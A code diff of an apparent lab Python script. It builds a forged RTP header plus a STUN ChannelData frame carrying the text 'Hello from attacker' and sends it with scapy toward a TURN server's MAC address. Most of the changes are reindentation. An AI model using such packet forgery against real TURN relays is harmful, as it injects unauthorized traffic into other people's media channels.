@@ -24,36 +24,34 @@ def mac_adres():
       
 
 def fakeDataPacketWithChannel(channel_nummer):
-    # RTP header fields
-    version = 2         # 2 bits
-    padding = 0         # 1 bit
-    extension = 0       # 1 bit
-    cc = 0              # 4 bits
-    marker = 0          # 1 bit
-    payload_type = 96   # 7 bits (dynamic range)
-    sequence_number = random.randint(0, 65535)
-    print(sequence_number)
-    timestamp = random.randint(0, 2**32 - 1)
-    ssrc = random.randint(0, 2**32 - 1)
-
-    # First byte: V (2 bits), P (1 bit), X (1 bit), CC (4 bits)
-    b0 = (version << 6) | (padding << 5) | (extension << 4) | cc
-    # Second byte: M (1 bit), PT (7 bits)
-    b1 = (marker << 7) | payload_type
-
-    # Pack RTP header using struct
-    rtp_header = struct.pack('!BBHII', b0, b1, sequence_number, timestamp, ssrc)
-
-    # STUN ChannelData fields
-    channel_number = channel_nummer
-    payload = b"Hello from attacker"
-    length = len(payload)
-    channel_header = channel_number.to_bytes(2, 'big') + length.to_bytes(2, 'big')
-    stun_frame = channel_header + payload
-
-    # Combine RTP + STUN ChannelData
-    frame = rtp_header + stun_frame
-    return frame
+      # RTP header fields
+      version = 2         
+      padding = 0         
+      extension = 0       
+      cc = 0              
+      marker = 0          
+      payload_type = 96   
+      sequence_number = random.randint(0, 65535)
+      print(sequence_number)
+      timestamp = random.randint(0, 2**32 - 1)
+      ssrc = random.randint(0, 2**32 - 1)
+      b0 = (version << 6) | (padding << 5) | (extension << 4) | cc
+      # Second byte: M (1 bit), PT (7 bits)
+      b1 = (marker << 7) | payload_type
+      
+      # Pack RTP header using struct
+      rtp_header = struct.pack('!BBHII', b0, b1, sequence_number, timestamp, ssrc)
+      
+      # STUN ChannelData fields
+      channel_number = channel_nummer
+      payload = b"Hello from attacker"
+      length = len(payload)
+      channel_header = channel_number.to_bytes(2, 'big') + length.to_bytes(2, 'big')
+      stun_frame = channel_header + payload
+      
+      # Combine RTP + STUN ChannelData
+      frame = rtp_header + stun_frame
+      return frame
 
 #generate a 
 def creatPermissionRequest():
@@ -90,7 +88,6 @@ def createPacket(type, mac ,channel = None):
 TURN_SERVER_MAC = mac_adres()
 #28:d0:ea:f1:27:cd
 #print(TURN_SERVER_MAC)
-#print(get_if_list())
 if TURN_SERVER_MAC == None:
       raise Exception("No mac found")
 sendp(createPacket("channel", TURN_SERVER_MAC, channel=channel_pr))
